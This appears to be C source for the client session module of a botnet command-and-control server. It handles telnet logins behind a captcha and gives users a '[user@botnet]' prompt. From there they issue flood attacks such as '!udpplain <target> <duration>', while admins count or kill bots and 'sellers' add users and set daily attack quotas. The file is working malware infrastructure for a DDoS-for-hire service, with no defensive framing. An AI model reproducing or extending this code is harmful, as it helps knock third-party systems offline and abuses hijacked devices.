#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#include "attack.h"
#include "bot.h"
#include "util.h"
#include "debug.h"
#include "groups.h"
#include "client.h"
#include "online.h"
#include "bool.h"
#include "slots.h"
#include "main.h"

#include "attack.h"
#include "db.h"

BOOL attacks_enabled = TRUE;

void client_disconnect(client_t *client) {
	client->connected = FALSE;
	client->authenticated = FALSE;

	close(client->fd);
	client->fd = 0;
}

void client_setup(client_t *client, int fd) {
	client->fd = fd;
	client->connected = TRUE;
}

void client_log_user_event(client_t *client, int event, char *username) {
	FILE *fp = fopen("users.log", "a+");

	if (!fp) {
		puts("Something went wrong logging attacks!");
		exit(1);
	}

	time_t t = time(NULL);
	struct tm tm = *localtime(&t);

	switch (event) {
		case ADDUSER_EVENT:

			fprintf(fp, "[%d-%02d-%02d %02d:%02d:%02d] [%s] added user '%s'\n", 
				tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec,
				client->username, username);

			break;
		case DELETEUSER_EVENT:

			fprintf(fp, "[%d-%02d-%02d %02d:%02d:%02d] [%s] deleted user '%s'\n", 
				tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec,
				client->username, username);

			break;
		case RENEWUSER_EVENT:

			fprintf(fp, "[%d-%02d-%02d %02d:%02d:%02d] [%s] renewed user '%s'\n", 
				tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec,
				client->username, username);

			break;
	}

	fclose(fp);
}

void client_log_login(client_t *client, char *reason) {
	FILE *fp = fopen("login_attempt.log", "a+");

	if (!fp) {
		puts("Something went wrong logging attacks!");
		exit(1);
	}

	time_t t = time(NULL);
	struct tm tm = *localtime(&t);

	fprintf(fp, "[%d-%02d-%02d %02d:%02d:%02d] [%s] %s\n", 
		tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec,
			client->username, reason);

	fclose(fp);
}

void client_log_attack(client_t *client, char *attack) {
	FILE *fp = fopen("attack.log", "a+");

	if (!fp) {
		puts("Something went wrong logging attacks!");
		exit(1);
	}

	time_t t = time(NULL);
	struct tm tm = *localtime(&t);

	fprintf(fp, "[%d-%02d-%02d %02d:%02d:%02d] [%d.%d.%d.%d] [%s]: %s\n", 
		tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec,
		CONVERT_ADDR(client->addr.sin_addr.s_addr), client->username, attack);

	fclose(fp);
}

BOOL client_authenticate(client_t *client) {
	char captcha[10] = {0};

	util_sockprintf(client->fd, "\x1b[91mимя пользователя\x1b[0m: ");
	telnet_wait_for(client, client->username, sizeof(client->username) - 1, FALSE);
	util_strip(client->username);

	util_sockprintf(client->fd, "\x1b[91mпароль\x1b[0m: ");
	telnet_wait_for(client, client->password, sizeof(client->password) - 1, TRUE);
	util_strip(client->password);

#ifndef NOCAPTCHA
	int digit = rand_next() % 100;
	int digit2 = rand_next() % 100;

	util_sockprintf(client->fd, "Captcha (%d + %d): ", digit, digit2);
	telnet_wait_for(client, captcha, sizeof(captcha) - 1, FALSE);
	util_strip(captcha);

	int result = atoi(captcha);

	if (result != (digit + digit2)) {
		util_sockprintf(client->fd, "Incorrect captcha provided.\r\n");
		return FALSE;
	}
#endif

	return client_check_login(client);
}

void *client_titlewriter(void *client_ptr) {

	client_t *client = (client_t *)client_ptr;

	while (ATOMIC_GET(&client->authenticated)) {
		util_sockprintf(client->fd, "\033]0; Connected: %d | Slots: %d/%d | Attacks Left: %d/%d\007", 

			ATOMIC_GET(&bot_count), 
			attack_slot_count(), 
			ATTACK_SLOT_COUNT,

			sql_get_int_val(client->username, "daily_attacks_left"),
			sql_get_int_val(client->username, "daily_attacks")
		);
		sleep(1);
	}

	pthread_exit(0);
}

void client_help_menu(client_t *client) {
	util_sockprintf(client->fd, "\x1b[\033[91mPreset\x1b[0m: !udpplain <target> <duration>\033[0m\r\n");
	util_sockprintf(client->fd, "\x1b[\033[91mExample\x1b[0m: !udpplain 1.1.1.1 20 dport=80 len=1440\033[0m\r\n");
	util_sockprintf(client->fd, "\x1b[\033[91mList available options for flood\x1b[0m: !udpplain 1.1.1.1 10 \x1b[91m?\033[0m\r\n\r\n");

	for (int i = 0; i < LEN(methods); i++) {
		method_t *method = &methods[i];

		if (!has_method_access(client, method->flood))
			continue;

		util_sockprintf(client->fd, "\x1b[91m!%s\x1b[0m: %s\r\n", method->flood, method->description);
	}
}

void *client_session(void *fd_ptr) {
	client_t *client = calloc(1, sizeof(client_t));

	client_setup(client, *(int *)fd_ptr);
	telnet_send_query(client);

	if (!handle_iacs(client)) {
		client_disconnect(client);
		return NULL;		
	}

	if (!client_authenticate(client)) {
		client_disconnect(client);
		return NULL;
	}

	client->authenticated = TRUE;
	client_update_fields(client);

	pthread_create(&(pthread_t){0}, NULL, client_titlewriter, client);

	util_sockprintf(client->fd, "\033[2J\033[1;1H");

	while (client->connected) {
		util_sockprintf(client->fd, "\x1b[97m[\x1b[91m%s\x1b[97m@\x1b[91mbotnet\x1b[97m]\x1b[97m \x1b[0m", client->username);

		memset(client->buff, 0, sizeof(client->buff));
		int len = telnet_wait_for(client, client->buff, sizeof(client->buff), FALSE);

		if (len <= 0) {
			client_disconnect(client);
			continue;
		}

		util_strip(client->buff);

		if (util_startswith(client->buff, "!")) {

			if (ATOMIC_GET(&attacks_enabled) || client->admin)
				parse_attack(client);
			else {
				util_sockprintf(client->fd, "Attacks are disabled\r\n");
			}

		}
		else {
			if (!strcmp(client->buff, "clear")) {
				util_sockprintf(client->fd, "\033[2J\033[1;1H");
			}

			else if (!strcmp(client->buff, "help") || !strcmp(client->buff, "?"))
				client_help_menu(client);

			else if (!strcmp(client->buff, "bots") && client->admin)
				bot_list_count(client->fd);

			else if (!strcmp(client->buff, "latency") && client->admin)
				bot_list_latency(client->fd);

			else if (!strcmp(client->buff, "killallbots") && client->admin)
				bot_send_instruction(SUICIDE);

			else if (!strcmp(client->buff, "disableattacks") && client->admin) {
				util_sockprintf(client->fd, "Disabled global attacks\r\n");
				ATOMIC_SET(&attacks_enabled, FALSE);
			}

			else if (!strcmp(client->buff, "enableattacks") && client->admin) {
				util_sockprintf(client->fd, "Enabled global attacks\r\n");
				ATOMIC_SET(&attacks_enabled, TRUE);
			}

			else if (!strcmp(client->buff, "adduser") && (client->admin || client->seller))
				client_add_user(client);

			else if (!strcmp(client->buff, "deleteuser") && (client->admin || client->seller))
				client_delete_user(client);

			else if (!strcmp(client->buff, "listusers") && (client->admin || client->seller))
				client_list_users(client);

			else if (!strcmp(client->buff, "renewuser") && (client->admin || client->seller))
				client_renew_user(client);
			else if (!strcmp(client->buff, "renewhour") && (client->admin))
				client_renew_hour(client);

			else if (!strcmp(client->buff, "changeattacks") && (client->admin || client->seller))
				client_mod_daily_attacks(client);
			else if (!strcmp(client->buff, "addflood") && (client->admin))
				client_add_user_flood(client);

			else if (!strcmp(client->buff, "exit")) {
				client_disconnect(client);
			}
		}
	}
}

void *client_connection_handler(void *varg) {

	int srvfd = bind_and_listen(USER_CNC_PORT);

	if (srvfd <= 0)
		return NULL;

	while (TRUE) {
		int clientfd = accept(srvfd, NULL, NULL);

		if (clientfd <= 0) {
			perror("accept");
			continue;
		}

		pthread_create(&(pthread_t){0}, NULL, client_session, &clientfd);
	}
}
